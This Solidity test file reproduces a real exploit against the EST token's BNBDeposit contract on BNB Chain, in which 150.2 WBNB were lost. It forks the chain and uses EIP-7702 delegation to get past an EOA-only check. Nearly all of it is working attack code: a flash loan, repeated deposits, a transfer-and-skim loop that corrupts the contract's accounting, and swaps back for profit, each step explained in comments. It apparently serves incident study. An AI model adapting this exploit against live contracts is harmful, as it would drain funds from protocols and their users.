// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 150.2 WBNB
// Attacker : https://bscscan.com/address/0xCF300DE6F177ec10DB0d7f756ced3Ae2D2203BFd
// Attack Contract : https://bscscan.com/address/0xCF300DE6F177ec10DB0d7f756ced3Ae2D2203BFd
// Vulnerable Contract : https://bscscan.com/address/0xD4524Be41cd452576aB9FF7b68a0b89aF8498a91
// Attack Tx : https://bscscan.com/tx/0x2f1c33eaaaace728f6101ff527793387341021ef465a4a33f53a0037f5bd1626

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xD4524Be41cd452576aB9FF7b68a0b89aF8498a91#code

interface IEST {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
    function depositContract() external view returns (address);
}

interface IBNBDeposit {
    function deposit() external payable;
    function maxDeposit() external view returns (uint256);
    function totalLP() external view returns (uint256);
    function userInfo(
        address
    ) external view returns (address, uint256, uint256, uint256, uint256, uint256, bool);
}

interface IMoolah {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IMoolahFlashLoanCallback {
    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external;
}

address constant REAL_EXPLOITER = 0xCF300DE6F177ec10DB0d7f756ced3Ae2D2203BFd;
address constant EST = 0xD4524Be41cd452576aB9FF7b68a0b89aF8498a91;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant PANCAKE_ROUTER_2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract EST_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 89_060_337 - 1;
    address msgSender;
    uint256 senderPrivKey;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);

        vm.label(EST, "EST");
        vm.label(MOOLAH, "Moolah");
        vm.label(WBNB_ADDR, "WBNB");
        vm.label(IEST(EST).uniswapV2Pair(), "PancakePair");
        vm.label(IEST(EST).depositContract(), "BNBDeposit");

        fundingToken = WBNB_ADDR;

        // EIP-7702: attacker delegates code to Attacker contract via signAndAttachDelegation
        // This is essential — the exploit requires the EOA itself to execute contract code
        // (EOA bypass: BNBDeposit contract only allows EOAs to claim, not contracts)
        (msgSender, senderPrivKey) = makeAddrAndKey("FakeExploiter");
    }

    function testExploit() public balanceLog2(msgSender) {
        vm.startPrank(REAL_EXPLOITER);
        IEST(EST).transfer(msgSender, 2 ether);
        vm.stopPrank();

        vm.startPrank(msgSender, msgSender);
        vm.signAndAttachDelegation(address(new Attacker()), senderPrivKey);
        Attacker(payable(msgSender)).start(20_000 ether);
        vm.stopPrank();
    }
}

contract Attacker is IMoolahFlashLoanCallback {
    receive() external payable {}

    function start(
        uint256 _amount
    ) public {
        IMoolah moolah = IMoolah(MOOLAH);

        require(_amount <= IWBNB(payable(WBNB_ADDR)).balanceOf(MOOLAH));

        IWBNB(payable(WBNB_ADDR)).approve(MOOLAH, _amount);

        moolah.flashLoan(WBNB_ADDR, _amount, "");
    }

    function onMoolahFlashLoan(
        uint256,
        bytes calldata
    ) external {
        IWBNB wbnb = IWBNB(payable(WBNB_ADDR));
        IEST est = IEST(EST);
        IUniswapV2Pair uniswapPair = IUniswapV2Pair(est.uniswapV2Pair());
        IBNBDeposit bnbDeposit = IBNBDeposit(est.depositContract());

        // Step 1: Unwrap WBNB to BNB and repeatedly deposit into BNBDeposit
        uint256 depositPerTime = bnbDeposit.maxDeposit();
        wbnb.withdraw(depositPerTime * 30);
        while (address(this).balance > depositPerTime) {
            bnbDeposit.deposit{value: depositPerTime}();
        }

        // Step 2: Swap 400 WBNB for EST tokens
        _swapToken(address(bnbDeposit), WBNB_ADDR, EST, 400 ether);

        // Step 3: Send 1 EST to BNBDeposit to desync its internal state
        est.transfer(address(bnbDeposit), 1 ether);

        // Step 4: Swap remaining WBNB for more EST
        _swapToken(address(bnbDeposit), WBNB_ADDR, EST, wbnb.balanceOf(address(this)));

        // Step 5: Exploit skim() loop — repeatedly transfer EST to pair and skim to BNBDeposit
        // The skim() extracts unaccounted tokens from the pair, manipulating BNBDeposit balance
        for (uint256 i = 0; i < 100; i++) {
            uint256 amount = est.balanceOf(address(uniswapPair)) * 10 / 95;
            est.transfer(address(uniswapPair), amount);
            uniswapPair.skim(address(bnbDeposit));
        }

        // Step 6: Swap all EST back to WBNB for profit
        _swapToken(address(this), EST, WBNB_ADDR, est.balanceOf(address(this)));
    }

    function _swapToken(
        address _recipient,
        address _from,
        address _to,
        uint256 _amount
    ) internal {
        IERC20 fromToken = IERC20(_from);
        if (fromToken.allowance(address(this), PANCAKE_ROUTER_2) != type(uint256).max) {
            fromToken.approve(PANCAKE_ROUTER_2, type(uint256).max);
        }

        address[] memory path = new address[](2);
        path[0] = _from;
        path[1] = _to;
        IPancakeRouter(payable(PANCAKE_ROUTER_2))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(_amount, 0, path, _recipient, block.timestamp + 60);
    }
}
